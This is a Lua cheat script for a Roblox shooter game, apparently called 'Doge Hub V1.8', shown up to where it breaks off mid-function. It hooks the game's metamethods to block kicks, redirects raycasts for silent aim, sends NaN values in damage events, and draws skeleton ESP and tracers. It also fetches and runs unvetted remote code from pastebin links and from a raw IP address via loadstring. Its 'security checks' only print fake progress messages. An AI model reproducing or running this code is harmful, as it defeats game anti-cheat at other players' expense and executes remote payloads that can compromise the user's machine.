

--ibet opti bimbambu

if not LPH_OBFUSCATED then
    -- Define a series of functions that serve as placeholders when obfuscation is not active.
    
    -- Simple passthrough function for just-in-time (JIT) operations.
    LPH_JIT = function(...) 
        return ... 
    end
    
    -- Passthrough function for maximum JIT operations.
    LPH_JIT_MAX = function(...) 
        return ... 
    end
    
    -- Function to disable virtualization, simply returns the input function.
    LPH_NO_VIRTUALIZE = function(f) 
        return f 
    end
    
    -- Function to remove upvalues, returns a new function that calls the original with the same arguments.
    LPH_NO_UPVALUES = function(f) 
        return function(...) 
            return f(...) 
        end 
    end
    
    -- Placeholder for string encryption, returns the input string.
    LPH_ENCSTR = function(...) 
        return ... 
    end
    
    -- Placeholder for number encryption, returns the input number.
    LPH_ENCNUM = function(...) 
        return ... 
    end
    
    -- Function intended to cause a crash, in this case, it prints the traceback.
    LPH_CRASH = function() 
        return print(debug.traceback()) 
    end
end

local isfirstrun = true  -- Example variable, you should set this appropriately

if isfirstrun then
    -- Replace with your own file IDs
    local audioFileId = "1ZzPp2yzuOSIpLW5VIkYxt_h40q7lSB8J"  -- Example ID
    local audioUrl = "https://drive.google.com/uc?export=download&id=" .. audioFileId

    -- Download the audio file
    writefile("dogehubsecretmp3.mp3", game:HttpGet(audioUrl))
    
    local flex = Instance.new('Sound', game:GetService('CoreGui'))
    flex.SoundId = getcustomasset("dogehubsecretmp3.mp3")
    flex.PlaybackSpeed = 0.8
    flex.Volume = 1 -- Adjust to a reasonable volume (0 to 1)
    flex:Play()  -- Start playing the sound
end


local player = game:GetService("Players").LocalPlayer
local old

old = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    if method:lower() == "kick" then
        return warn("Blocked Kick By Anti Cheat ")
    end
    return old(self, ...)
end)

print("Started Anti Kick Script")

-- Initialize
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local ecpkey = '781HID91YRNCIQYWER7EUHF81774UFHHDVNDFUHG819UFJKHOGJFCXNSHGTGFYHRUEIGJRHFY2G6TR383285718TEDFXCSFX  RPEDY71847717458374183939N UQI71 4Y171U38473478143577381483748275827385723857832573285732857239ORD33894E  EWUEUR938R93849384913849138432954950YO6OLTİŞFEDKEWKJFEWJFHREGUERGJHERFHIWEJIOFEWUIFHERUYGFEWIFERHIUGHIUETGHUIERHGERIUIUFHIUSAHFEFIUEWFHWEUHR387TY3498WER734UY87TYF4RIUEFOVHJBRUBFVH DFNV BYUGFO8YUI3YEWF87YU    2Y298ERUDFHEH 12U B 1 4 5 6 54 3 56 7 8 9 87  4 4 3 3 3 22 1 1 1 1 1 2 2 22 2 2 3 3 3 3 3 3 3 3 4 4 4 4 4 4 5 5 5 5 5 5 5 56 6 6 6 6 6 6 6 77 7 7 7 7 7 7 8 8 8 8 8 8 8 8  9 9 9 9 9 9 9 99 9 9 9 9 9 0   * * * * 0 0 0 0 0 0 0 0 0 0 0    ############ 661 ** -- 177841 -- 13784 -17749174 AHR ---- 81* --14781HID91YRNCIQYWER7EUHF81774UFHHDVNDFUHG819UFJKHOGJFCXNSHGTGFYHRUEIGJRHFY2G6TR383285718TEDFXCSFX  RPEDY71847717458374183939N UQI71 4Y171U38473478143577381483748275827385723857832573285732857239ORD33894E  EWUEUR938R93849384913849138432954950YO6OLTİŞFEDKEWKJFEWJFHREGUERGJHERFHIWEJIOFEWUIFHERUYGFEWIFERHIUGHIUETGHUIERHGERIUIUFHIUSAHFEFIUEWFHWEUHR387TY3498WER734UY87TYF4RIUEFOVHJBRUBFVH DFNV BYUGFO8YUI3YEWF87YU    2Y298ERUDFHEH 12U B 1 4 5 6 54 3 56 7 8 9 87  4 4 3 3 3 22 1 1 1 1 1 2 2 22 2 2 3 3 3 3 3 3 3 3 4 4 4 4 4 4 5 5 5 5 5 5 5 56 6 6 6 6 6 6 6 77 7 7 7 7 7 7 8 8 8 8 8 8 8 8  9 9 9 9 9 9 9 99 9 9 9 9 9 0   * * * * 0 0 0 0 0 0 0 0 0 0 0    ############ 661 ** -- 177841 -- 13784 -17749174 AHR ---- 81* --14'
local selectedecpkey = "781HID91YRNCIQYWER7EUHF81774UFHHDVNDFUHG819UFJKHOGJFCXNSHGTGFYHRUEIGJRHFY2G6TR383285718TEDFXCSFX  RPEDY71847717458374183939N UQI71 4Y171U38473478143577381483748275827385723857832573285732857239ORD33894E  EWUEUR938R93849384913849138432954950YO6OLTİŞFEDKEWKJFEWJFHREGUERGJHERFHIWEJIOFEWUIFHERUYGFEWIFERHIUGHIUETGHUIERHGERIUIUFHIUSAHFEFIUEWFHWEUHR387TY3498WER734UY87TYF4RIUEFOVHJBRUBFVH DFNV BYUGFO8YUI3YEWF87YU    2Y298ERUDFHEH 12U B 1 4 5 6 54 3 56 7 8 9 87  4 4 3 3 3 22 1 1 1 1 1 2 2 22 2 2 3 3 3 3 3 3 3 3 4 4 4 4 4 4 5 5 5 5 5 5 5 56 6 6 6 6 6 6 6 77 7 7 7 7 7 7 8 8 8 8 8 8 8 8  9 9 9 9 9 9 9 99 9 9 9 9 9 0   * * * * 0 0 0 0 0 0 0 0 0 0 0    ############ 661 ** -- 177841 -- 13784 -17749174 AHR ---- 81* --14781HID91YRNCIQYWER7EUHF81774UFHHDVNDFUHG819UFJKHOGJFCXNSHGTGFYHRUEIGJRHFY2G6TR383285718TEDFXCSFX  RPEDY71847717458374183939N UQI71 4Y171U38473478143577381483748275827385723857832573285732857239ORD33894E  EWUEUR938R93849384913849138432954950YO6OLTİŞFEDKEWKJFEWJFHREGUERGJHERFHIWEJIOFEWUIFHERUYGFEWIFERHIUGHIUETGHUIERHGERIUIUFHIUSAHFEFIUEWFHWEUHR387TY3498WER734UY87TYF4RIUEFOVHJBRUBFVH DFNV BYUGFO8YUI3YEWF87YU    2Y298ERUDFHEH 12U B 1 4 5 6 54 3 56 7 8 9 87  4 4 3 3 3 22 1 1 1 1 1 2 2 22 2 2 3 3 3 3 3 3 3 3 4 4 4 4 4 4 5 5 5 5 5 5 5 56 6 6 6 6 6 6 6 77 7 7 7 7 7 7 8 8 8 8 8 8 8 8  9 9 9 9 9 9 9 99 9 9 9 9 9 0   * * * * 0 0 0 0 0 0 0 0 0 0 0    ############ 661 ** -- 177841 -- 13784 -17749174 AHR ---- 81* --14"
local E01Key = '0000000000000000000000000000000000000000000000000001'
local selectedE01Key = "0000000000000000000000000000000000000000000000000001"
local E02Key = '0000000000000000000000000000000000000000000000000021'
local selectedE02Key = "0000000000000000000000000000000000000000000000000021"
local asstable={
hook='mafaka'

}
print(asstable)
print(asstable.hook)
if selectedE01Key == E01Key then
    print("E01 Key True")
else
    print("E01 Key Invalid")
    print("Aborted")
    return
end

if selectedecpkey == ecpkey then
    print("ECP Key True")
else
    print("ECP Key Invalid")
    return
end

if selectedE02Key == E02Key then
    print("E02 Key True")
else
    print("E02 Key Invalid")
    print("Aborted")
    return
end



local level = "1.4"
local function securitylayerchecks()

warn("Started")
wait(1)
print("CHECK 1")
wait(0.7)
print("CHECK 2")
wait(0.1)
print("CHECK 3")
wait(2)
print("CHECK 4")
wait(2)
print("Verification Level: " .. level .."")
warn("CONTINUE")



end

securitylayerchecks()

local hwid = "A0c92155d3650ec09ae39fcc016ca3cff4dd912cc63aca3043513ba9617d2ed16d800f8a209c6b899cd4200dd25aa8981"


local hwids = {
    "dadfa35227e615d81abe69b1c03037390bb6d1221087d499f78110f0201697be627ea3e34379fe768021a27fdd852acc",

"68ee4e3dca91ace520cf83af8a714c2668c0e9b07d33c24ccd5759aefb270e3c52797d4a0392d0a65401e0d694136c66",

"31303537623231366434653236383139396464653533373934643335313134346562386133303838616231333639376164643563626266356637653239663636",

"869251a11bc79716dc5a691fc03c6bf24839ae1bcf552b16632a3d4cc48573f459911320417c61dc94d03d9f7849efc2",

"35386438336163373763353962316330316331336433616234366237313165316136626336643737323563306661373730363636326634626339656437653735",

"61303363333937303039666235656461663930363337396434636630356364666231653831373465656137343138376234666265373562636463386135376164",

"36363037336361333937623336386663386666646236613066626638383166353830616663653330613464343034353731306236666561623862333738373964",

"65326566396235633062396663636438333765613663343262393832663666366564353662356363633766363139393866636437393536353933643234353738",
    "0c92155d3650ec09ae39fcc016ca3cff4dd912cc63aca3043513ba9617d2ed16d800f8a209c6b899cd4200dd25aa8981",
    "5b70929f45ad9f417dfd7d990785f2e94b61230c5f4d53",
    "another_hwid_example_2"
}



local function checkForSameScript(hwid)
    for _, id in ipairs(hwids) do
        if id == hwid then
            print("Player with HWID " .. hwid .. " is using the same script.")
            return
        end
    end
    print("Player with HWID " .. hwid .. " is not using the same script.")
end


checkForSameScript(hwid)





local continueexecution = true


if continueexecution == true then

print("Value True")
print("1")

else
wait(5)
print("Server Did Not Responded.")

return

end


print("2")

print("Connected")
local camera = workspace.CurrentCamera

local function checksystem()

warn("Check System Started")
wait(1)
print("Able To Connect Web Socket: ❌")
	wait(0.2)
	print("Able To Connect Proxy Server: ❌")
	wait(0.1)
	print("Able To Send Messages To Webhook: ❌")
	wait(0.1)
	
warn("System Disconnected With 0% Success Rate.")

end

-- Pastebin URL
local pastebinUrl = "https://pastebin.com/raw/SLtzK1Vp"

-- Function to fetch and loadstring the pastebin code
local success, response = pcall(function()
    return loadstring(game:HttpGet(pastebinUrl))()
end)

-- Check the response
if success and response == "bypassed" then
    -- Pastebin returned "active", so continue running the main script
    print("A-C SYSTEM RESULT: BYPASS")

    -- Place your main script logic here
    -- Example: your main exploit code or game feature

else
    -- Pastebin returned nil or there's an error, script won't run
    print("Anti-Crack System Trigered!")
    return
end
print(".")
print("DIRECTED.")

-- Function to print the loading bar with percentage and hash marks
local function printLoadingBar(percentage)
    local totalLength = 33
    local hashMarks = math.floor(percentage / 3.2)  -- Number of hash marks
    local dashes = totalLength - hashMarks          -- Remaining dashes
    
    local loadingBar = string.rep("#", hashMarks) .. string.rep("-", dashes)
    warn(string.format("Loading Doge Hub V1.8 %%%-3d %s", percentage, loadingBar))
end

-- Function to simulate the loading process
local function simulateLoading()
    for percentage = 0, 100, 1 do
        printLoadingBar(percentage)
        wait(0.02)  -- Adjust the wait time to make the loading appear slower or faster
    end
end

-- Run the simulation
simulateLoading()

print("If script ui not appears try spawning and waiting for 2 min")
warn("Silent Check 5")
wait(0.2)
warn("end")


local players = game:GetService("Players")
local localPlayer = players.LocalPlayer
print("ok")
local repo2 = "http://31.210.171.229:3000/new/"
local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'
_esplib = loadstring(game:HttpGet(repo2 .. 'newlib/old/esp'))()
local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()

local Window = Library:CreateWindow({
    -- Set Center to true if you want the menu to appear in the center
    -- Set AutoShow to true if you want the menu to appear when it is created
    -- Position and Size are also valid options here
    -- but you do not need to define them unless you are changing them :)

    Title = '                      Doge Hub /\ Wave PD',
    Center = true,
    AutoShow = true,
    TabPadding = 8,
    MenuFadeTime = 1.3
})

-- CALLBACK NOTE:
-- Passing in callback functions via the initial element parameters (i.e. Callback = function(Value)...) works
-- HOWEVER, using Toggles/Options.INDEX:OnChanged(function(Value) ... ) is the RECOMMENDED way to do this.
-- I strongly recommend decoupling UI code from logic code. i.e. Create your UI elements FIRST, and THEN setup :OnChanged functions later.

-- You do not have to set your tabs & groups up this way, just a prefrence.
local Tabs = {
    -- Creates a new tab titled Main
    Main = Window:AddTab('combat ⚔️'),
    antiaimtab = Window:AddTab('Anti-Aim 🛡️'),
    movetab3 = Window:AddTab('Misc 🔅'),
    ['UI Settings'] = Window:AddTab('UI Settings 🎚️'),
}

-- Groupbox and Tabbox inherit the same functions
-- except Tabboxes you have to call the functions on a tab (Tabbox:AddTab(name))
local antiaimtab = Tabs.antiaimtab:AddLeftGroupbox('Spin')
local LeftGroupBox = Tabs.Main:AddLeftGroupbox('Groupbox')
local Esptab3 = Tabs.movetab3:AddLeftGroupbox('Movement')


-- We can also get our Main tab via the following code:
-- local LeftGroupBox = Window.Tabs.Main:AddLeftGroupbox('Groupbox')

-- Tabboxes are a tiny bit different, but here's a basic example:
--[[

local TabBox = Tabs.Main:AddLeftTabbox() -- Add Tabbox on left side

local Tab1 = TabBox:AddTab('Tab 1')
local Tab2 = TabBox:AddTab('Tab 2')

-- You can now call AddToggle, etc on the tabs you added to the Tabbox
]]
-- Silent Aim Configuration

	

local Players = game:GetService("Players")


-- Function to send a notification
local function sendNotification(message)
    game.StarterGui:SetCore("SendNotification", {
        Title = "Doge Hub User Found!";
        Text = message;
        Duration = 5;
    })
end

print("Script initialized.")

-- Configuration
local teleportThresholdSmall = 6000 -- Threshold for small teleportation
local teleportThresholdLarge = 90000 -- Threshold for large teleportation
local checkInterval = 0.01 -- Interval to check player positions (in seconds)
local playerPositions = {} -- Store players' previous positions
local flaggedPlayers = {} -- Store players who have already been flagged
local bypassFlag = false -- Set to true to bypass flag detection

-- Function to detect teleportation
local function detectTeleportation(player, oldPosition, newPosition)
    local distance = (newPosition - oldPosition).Magnitude

    if not bypassFlag then
        if distance >= teleportThresholdLarge and not flaggedPlayers[player.Name] then
            flaggedPlayers[player.Name] = true
            print(player.Name .. " flagged for large teleportation!")
            sendNotification("Doge Hub User Found: " .. player.Name .. " Executor: Wave")
        elseif distance >= teleportThresholdSmall and distance < teleportThresholdLarge and not flaggedPlayers[player.Name] then
            flaggedPlayers[player.Name] = true
            print(player.Name .. " flagged for small teleportation!")
            sendNotification("Doge Hub User Found: " .. player.Name .. " Executor: Solara")
        end
    end
end

-- Main loop to track player positions and detect teleportation
local function trackPlayers()
    print("Tracking players started.")
    while true do
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local humanoidRootPart = player.Character.HumanoidRootPart
                local currentPosition = humanoidRootPart.Position

                if playerPositions[player.Name] then
                    local oldPosition = playerPositions[player.Name]
                    detectTeleportation(player, oldPosition, currentPosition)
                else
                    print(player.Name .. " has no previous position tracked.")
                end

                playerPositions[player.Name] = currentPosition
            else
                playerPositions[player.Name] = nil
            end
        end

        wait(checkInterval)
    end
end
local ammo = game.ReplicatedStorage.AmmoTypes

-- Start tracking players


-- Load external script
print("Attempting to load external script...")
local success, err = pcall(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
end)

if not success then
    print("Error loading external script: " .. err)
end


	loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
	Library:Notify("CHECK 1")
	wait(0.6)
	Library:Notify("Locked")
	wait(1)
	loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
	Library:Notify("Unlocked")
	Library:Notify("CHECK 2")
	wait(0.1)
	loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
	Library:Notify("CHECK 3")
	wait(1)
	loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
	Library:Notify("Check 100%")










local silent_aim = {
    enabled = false,  -- Toggle this to enable/disable silent aim
    fov = true,
    fovsize = 130,
    part = "Head",
    targetai = true
}



local RunService = game:GetService("RunService")
-- Define Players
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local GuiInset = game:GetService("GuiService"):GetGuiInset()
local Camera = workspace.CurrentCamera  -- Ensure Camera is correctly set

local function get_closest_target(usefov, fov_size, aimpart, npc)
    local part, isnpc = nil, false
    local maximum_distance = usefov and fov_size or math.huge
    local mousepos = Vector2.new(Mouse.X, Mouse.Y)
    
    if npc then
        for _, zone in pairs(workspace.AiZones:GetChildren()) do
            for _, npc in pairs(zone:GetChildren()) do
                local hitpart = npc:FindFirstChild(aimpart)
                local humanoid = npc:FindFirstChildOfClass("Humanoid")
                if hitpart and humanoid then
                    local position, onscreen = Camera:WorldToViewportPoint(hitpart.Position) -- Replace with hitpart:GetPivot() if needed
                    local distance = (Vector2.new(position.X, position.Y - GuiInset.Y) - mousepos).Magnitude
                    if (usefov and onscreen or not usefov) and distance < maximum_distance then
                        part = hitpart
                        maximum_distance = distance
                        isnpc = true
                    end
                end
            end
        end
    end

    for _, plr in Players:GetPlayers() do
        local character = plr.Character
        if plr ~= LocalPlayer and character then
            local hitpart = character:FindFirstChild(aimpart)
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if hitpart and humanoid then
                local position, onscreen = Camera:WorldToViewportPoint(hitpart.Position) -- Replace with hitpart:GetPivot() if needed
                local distance = (Vector2.new(position.X, position.Y - GuiInset.Y) - mousepos).Magnitude
                if (usefov and onscreen or not usefov) and distance <= maximum_distance then
                    part = hitpart
                    maximum_distance = distance
                    isnpc = false
                end
            end
        end
    end

    return part, isnpc
end

RunService.Heartbeat:Connect(function()
    if silent_aim.enabled then
        silent_aim.target_part, silent_aim.is_npc = get_closest_target(silent_aim.fov, silent_aim.fovsize, silent_aim.part, silent_aim.targetai)
    end
end)

local oldNameCall
oldNameCall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    if checkcaller() then return oldNameCall(self, ...) end
    local method = getnamecallmethod()
    if method == "FireServer" then
        if self.Name == "ProjectileInflict" then
            local args = {...}
            if type(args[3]) == "number" and args[3] >= 0 and args[3] <= 10 then
                return coroutine.yield()
            end
            args[4] = 0/0
            return oldNameCall(self, unpack(args))
        end
    end
    if method == "Raycast" and silent_aim.enabled and silent_aim.target_part then
        local args = {...}
        args[2] = (silent_aim.target_part.Position - args[1]).Unit * 10000 -- Use GetPivot if needed
        return oldNameCall(self, unpack(args))
    end
    return oldNameCall(self, ...)
end))


-- Key Toggle Functionality
--[[UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
    if gameProcessedEvent then return end  -- Ignore input if the game is processing it
    if input.KeyCode == Enum.KeyCode.B then
        silent_aim.enabled = not silent_aim.enabled
        print("Silent Aim " .. (silent_aim.enabled and "Enabled" or "Disabled"))
    end
end)

--]]



-- Fetching a toggle object for later use:
-- Toggles.MyToggle.Value

-- Toggles is a table added to getgenv() by the library
-- You index Toggles with the specified index, in this case it is 'MyToggle'
-- To get the state of the toggle you do toggle.Value

-- Calls the passed function when the toggle is updated


-- This should print to the console: "My toggle state changed! New value: false"


-- 1/15/23
-- Deprecated old way of creating buttons in favor of using a table
-- Added DoubleClick button functionality

--[[
    Groupbox:AddButton
    Arguments: {
        Text = string,
        Func = function,
        DoubleClick = boolean
        Tooltip = string,
    }

    You can call :AddButton on a button to add a SubButton!
]]
local runService = game:GetService("RunService")
local playersService = game:GetService("Players")
local userInputService = game:GetService("UserInputService")


-- FOV Settings
local fovRadius = 180
local fovCircle
local fovSize = fovRadius

-- Settings
local minPrediction = 0.05
local maxPrediction = 0.45
local defaultPrediction = 0.15
local predictionAmount = defaultPrediction

local minDistance = 10
local maxDistance = 900

-- Variables to track aiming state and debugging
local isAiming = false
local lockedCharacter = nil
local debugEnabled = true -- Enable debugging

-- Create variables for visibility text and version text
local visibilityText = nil
local versionText = nil

-- Table to store tracers
local tracers = {}

-- Function to create the FOV circle
local function createFovCircle()
    if fovCircle then
        fovCircle:Remove()
    end
    fovCircle = Drawing.new("Circle")
    fovCircle.Thickness = 2
    fovCircle.NumSides = 100
    fovCircle.Radius = fovSize  -- Set the FOV size
    fovCircle.Color = Color3.new(1, 1, 1) -- White color
    fovCircle.Filled = false
    fovCircle.Visible = true
    fovCircle.Transparency = 1

    -- Create visibility text
    visibilityText = Drawing.new("Text")
    visibilityText.Size = 16
    visibilityText.Center = true
    visibilityText.Outline = true
    visibilityText.Color = Color3.new(1, 1, 1) -- White text by default
    visibilityText.Font = 2
    visibilityText.Visible = false

    -- Create version text
    versionText = Drawing.new("Text")
    versionText.Size = 16
    versionText.Center = true
    versionText.Outline = true
    versionText.Color = Color3.new(1, 1, 1) -- White text for version
    versionText.Text = "Doge Hub V1.8"
    versionText.Font = 2
    versionText.Visible = true
end

-- Update FOV circle position
local function updateFovCircle()
    if fovCircle then
        local screenCenter = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
        fovCircle.Position = screenCenter
        fovCircle.Radius = fovSize

        visibilityText.Position = Vector2.new(screenCenter.X, screenCenter.Y + fovSize + 10)
        versionText.Position = Vector2.new(screenCenter.X, screenCenter.Y + fovSize + 30)
    end
end

-- Function to create or update a tracer from the mouse to a player's head
local function createOrUpdateTracer(player)
    local character = player.Character
    if character and character:FindFirstChild("Head") then
        local head = character.Head
        local screenPos, onScreen = camera:WorldToViewportPoint(head.Position)

        if onScreen then
            local mousePos = userInputService:GetMouseLocation()
            local playerX, playerY = screenPos.X, screenPos.Y

            if not tracers[player] then
                tracers[player] = Drawing.new("Line")
                tracers[player].Thickness = 1
                tracers[player].Color = Color3.new(1, 1, 1)
                tracers[player].Transparency = 1
                tracers[player].Visible = true
            end
            tracers[player].From = Vector2.new(mousePos.X, mousePos.Y)
            tracers[player].To = Vector2.new(playerX, playerY)
            tracers[player].Visible = true
        else
            if tracers[player] then
                tracers[player].Visible = false -- Hide tracer if not on screen
            end
        end
    else
        if tracers[player] then
            tracers[player].Visible = false -- Hide tracer if character is invalid
        end
    end
end

-- Function to check if player is within the FOV circle
local function isPlayerInFov(player)
    local character = player.Character
    if character and character:FindFirstChild("Head") then
        local headPosition = character.Head.Position
        local screenPos, onScreen = camera:WorldToViewportPoint(headPosition)

        if onScreen then
            local screenCenter = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
            local distance = (screenCenter - Vector2.new(screenPos.X, screenPos.Y)).Magnitude
            return distance <= fovSize
        end
    end
    return false
end

-- Function to check if player is visible (not occluded)
local function isPlayerVisible(player)
    local character = player.Character
    if character and character:FindFirstChild("Head") then
        local head = character.Head
        local cameraPosition = camera.CFrame.Position
        
        -- Raycasting to check if there is an obstruction
        local ray = Ray.new(cameraPosition, (head.Position - cameraPosition).unit * (head.Position - cameraPosition).Magnitude)
        local hitPart, hitPosition = workspace:FindPartOnRay(ray, character) -- Include the character in the raycast filtering

        -- Ensure hitPart is not the character's head
        if hitPart and hitPart:IsDescendantOf(character) then
            return false -- Not visible if the ray hits any part of the character
        end
        
        return true -- If ray didn't hit anything or only hit the head, the player is visible
    end
    return false
end

-- Update visibility text based on players in FOV
local function updateVisibilityText(playersInFov)
    if #playersInFov > 0 then
        visibilityText.Text = "VISIBLE: " .. table.concat(playersInFov, ", ")
        visibilityText.Color = Color3.new(0, 1, 0) -- Green text for visible
        visibilityText.Visible = true
    else
        visibilityText.Visible = false -- Hide the text if no players are in FOV
    end
end

-- Clear all tracers
local function clearAllTracers()
    for player, tracer in pairs(tracers) do
        tracer.Visible = false
    end
end

-- Update FOV Circle and Tracers every frame
runService.RenderStepped:Connect(function()
    if fovCircle and fovCircle.Visible then
        updateFovCircle()

        local playersInFov = {}

        for _, player in pairs(playersService:GetPlayers()) do
            if player ~= playersService.LocalPlayer then
                if isPlayerInFov(player) and isPlayerVisible(player) then
                    -- Add player to the list only if they are in FOV and visible
                    table.insert(playersInFov, player.Name)
                    createOrUpdateTracer(player) -- Create tracer for this player
                else
                    if tracers[player] then
                        tracers[player].Visible = false -- Hide tracer if not visible
                    end
                end
            end
        end

        -- Update visibility text based on players in FOV
        updateVisibilityText(playersInFov)
    end
end)

-- Clear tracers every 10 seconds
coroutine.wrap(clearAllTracers)

-- Call the function to create the FOV circle and text
createFovCircle()



local Player = game:GetService("Players").LocalPlayer


local isESPEnabled = false -- Toggle state

local function DrawLine()
    local l = Drawing.new("Line")
    l.Visible = false
    l.From = Vector2.new(0, 0)
    l.To = Vector2.new(1, 1)
    l.Color = Color3.fromRGB(255, 255, 255) -- White color
    l.Thickness = 1
    l.Transparency = 1
    return l
end

local function DrawESP(plr)
    repeat wait() until plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil
    local limbs = {}
    local R15 = (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15) and true or false
    if R15 then 
        limbs = {
            -- Spine
            Head_UpperTorso = DrawLine(),
            UpperTorso_LowerTorso = DrawLine(),
            -- Left Arm
            UpperTorso_LeftUpperArm = DrawLine(),
            LeftUpperArm_LeftLowerArm = DrawLine(),
            LeftLowerArm_LeftHand = DrawLine(),
            -- Right Arm
            UpperTorso_RightUpperArm = DrawLine(),
            RightUpperArm_RightLowerArm = DrawLine(),
            RightLowerArm_RightHand = DrawLine(),
            -- Left Leg
            LowerTorso_LeftUpperLeg = DrawLine(),
            LeftUpperLeg_LeftLowerLeg = DrawLine(),
            LeftLowerLeg_LeftFoot = DrawLine(),
            -- Right Leg
            LowerTorso_RightUpperLeg = DrawLine(),
            RightUpperLeg_RightLowerLeg = DrawLine(),
            RightLowerLeg_RightFoot = DrawLine(),
        }
    else 
        limbs = {
            Head_Spine = DrawLine(),
            Spine = DrawLine(),
            LeftArm = DrawLine(),
            LeftArm_UpperTorso = DrawLine(),
            RightArm = DrawLine(),
            RightArm_UpperTorso = DrawLine(),
            LeftLeg = DrawLine(),
            LeftLeg_LowerTorso = DrawLine(),
            RightLeg = DrawLine(),
            RightLeg_LowerTorso = DrawLine()
        }
    end

    local function Visibility(state)
        for i, v in pairs(limbs) do
            v.Visible = state
        end
    end

    local function UpdaterR15()
        local connection
        connection = game:GetService("RunService").RenderStepped:Connect(function()
            if isESPEnabled then
                if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") ~= nil and plr.Character.Humanoid.Health > 0 then
                    local HUM, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
                    if vis then
                        -- Head
                        local H = Camera:WorldToViewportPoint(plr.Character.Head.Position)
                        if limbs.Head_UpperTorso.From ~= Vector2.new(H.X, H.Y) then
                            --Spine
                            local UT = Camera:WorldToViewportPoint(plr.Character.UpperTorso.Position)
                            local LT = Camera:WorldToViewportPoint(plr.Character.LowerTorso.Position)
                            -- Left Arm
                            local LUA = Camera:WorldToViewportPoint(plr.Character.LeftUpperArm.Position)
                            local LLA = Camera:WorldToViewportPoint(plr.Character.LeftLowerArm.Position)
                            local LH = Camera:WorldToViewportPoint(plr.Character.LeftHand.Position)
                            -- Right Arm
                            local RUA = Camera:WorldToViewportPoint(plr.Character.RightUpperArm.Position)
                            local RLA = Camera:WorldToViewportPoint(plr.Character.RightLowerArm.Position)
                            local RH = Camera:WorldToViewportPoint(plr.Character.RightHand.Position)
                            -- Left leg
                            local LUL = Camera:WorldToViewportPoint(plr.Character.LeftUpperLeg.Position)
                            local LLL = Camera:WorldToViewportPoint(plr.Character.LeftLowerLeg.Position)
                            local LF = Camera:WorldToViewportPoint(plr.Character.LeftFoot.Position)
                            -- Right leg
                            local RUL = Camera:WorldToViewportPoint(plr.Character.RightUpperLeg.Position)
                            local RLL = Camera:WorldToViewportPoint(plr.Character.RightLowerLeg.Position)
                            local RF = Camera:WorldToViewportPoint(plr.Character.RightFoot.Position)

                            --Head
                            limbs.Head_UpperTorso.From = Vector2.new(H.X, H.Y)
                            limbs.Head_UpperTorso.To = Vector2.new(UT.X, UT.Y)

                            --Spine
                            limbs.UpperTorso_LowerTorso.From = Vector2.new(UT.X, UT.Y)
                            limbs.UpperTorso_LowerTorso.To = Vector2.new(LT.X, LT.Y)

                            -- Left Arm
                            limbs.UpperTorso_LeftUpperArm.From = Vector2.new(UT.X, UT.Y)
                            limbs.UpperTorso_LeftUpperArm.To = Vector2.new(LUA.X, LUA.Y)

                            limbs.LeftUpperArm_LeftLowerArm.From = Vector2.new(LUA.X, LUA.Y)
                            limbs.LeftUpperArm_LeftLowerArm.To = Vector2.new(LLA.X, LLA.Y)

                            limbs.LeftLowerArm_LeftHand.From = Vector2.new(LLA.X, LLA.Y)
                            limbs.LeftLowerArm_LeftHand.To = Vector2.new(LH.X, LH.Y)

                            -- Right Arm
                            limbs.UpperTorso_RightUpperArm.From = Vector2.new(UT.X, UT.Y)
                            limbs.UpperTorso_RightUpperArm.To = Vector2.new(RUA.X, RUA.Y)

                            limbs.RightUpperArm_RightLowerArm.From = Vector2.new(RUA.X, RUA.Y)
                            limbs.RightUpperArm_RightLowerArm.To = Vector2.new(RLA.X, RLA.Y)

                            limbs.RightLowerArm_RightHand.From = Vector2.new(RLA.X, RLA.Y)
                            limbs.RightLowerArm_RightHand.To = Vector2.new(RH.X, RH.Y)

                            -- Left Leg
                            limbs.LowerTorso_LeftUpperLeg.From = Vector2.new(LT.X, LT.Y)
                            limbs.LowerTorso_LeftUpperLeg.To = Vector2.new(LUL.X, LUL.Y)

                            limbs.LeftUpperLeg_LeftLowerLeg.From = Vector2.new(LUL.X, LUL.Y)
                            limbs.LeftUpperLeg_LeftLowerLeg.To = Vector2.new(LLL.X, LLL.Y)

                            limbs.LeftLowerLeg_LeftFoot.From = Vector2.new(LLL.X, LLL.Y)
                            limbs.LeftLowerLeg_LeftFoot.To = Vector2.new(LF.X, LF.Y)

                            -- Right Leg
                            limbs.LowerTorso_RightUpperLeg.From = Vector2.new(LT.X, LT.Y)
                            limbs.LowerTorso_RightUpperLeg.To = Vector2.new(RUL.X, RUL.Y)

                            limbs.RightUpperLeg_RightLowerLeg.From = Vector2.new(RUL.X, RUL.Y)
                            limbs.RightUpperLeg_RightLowerLeg.To = Vector2.new(RLL.X, RLL.Y)

                            limbs.RightLowerLeg_RightFoot.From = Vector2.new(RLL.X, RLL.Y)
                            limbs.RightLowerLeg_RightFoot.To = Vector2.new(RF.X, RF.Y)
                        end

                        if limbs.Head_UpperTorso.Visible ~= true then
                            Visibility(true)
                        end
                    else 
                        if limbs.Head_UpperTorso.Visible ~= false then
                            Visibility(false)
                        end
                    end
                else 
                    if limbs.Head_UpperTorso.Visible ~= false then
                        Visibility(false)
